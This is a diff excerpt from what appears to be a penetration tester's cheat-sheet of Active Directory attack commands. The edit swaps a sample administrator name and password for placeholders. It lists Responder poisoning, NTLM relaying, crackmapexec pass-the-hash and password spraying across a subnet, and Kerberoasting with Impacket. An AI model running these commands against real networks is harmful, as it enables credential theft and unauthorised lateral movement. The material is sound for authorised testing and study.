@@ -122,10 +122,10 @@ sudo responder -I eth0 -dPv
 Impacket-ntlmrelax -tf targets.txt -smb2support -i 
 
 (PtH with crackmapexec)
-crackmapexec smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31dcfce0d16ae931b73c59d7e0c089c0
+crackmapexec smb 10.10.10.0/24 -u username -H aad3b435b51404eeaad3b435b51404ee:31dcfce0d16ae931b73c59d7e0c089c0
 
 (PtP with crackmapexec) 
-crackmapexec smb 10.10.10.0/24 -u administrator -p 'P@ssw0rd!'
+crackmapexec smb 10.10.10.0/24 -u username -p 'password'
 
 (Enumerate service principile names with their krbtgs (kerberos ticket granting service hash) - useful in AD envs when SPN objects are not set to read only.
 Impacket-GetUserSPNs -dc-ip <10.10.10.0> domain/username:password -request
